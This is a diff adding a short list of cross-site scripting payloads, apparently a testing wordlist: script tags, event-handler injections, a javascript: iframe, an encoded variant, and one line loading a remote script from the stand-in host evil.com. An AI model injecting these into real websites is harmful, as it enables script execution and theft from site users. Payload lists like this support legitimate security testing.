@@ -1,0 +1,9 @@
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+<svg/onload=confirm(1)>
+<iframe src="javascript:alert(1)">
+<body onload=prompt(1)>
+<details open ontoggle=alert(1)>
+"><script src=//evil.com/xss.js></script>
+<!-- encoded forms -->
+%3Cscript%3Ealert(1)%3C/script%3E
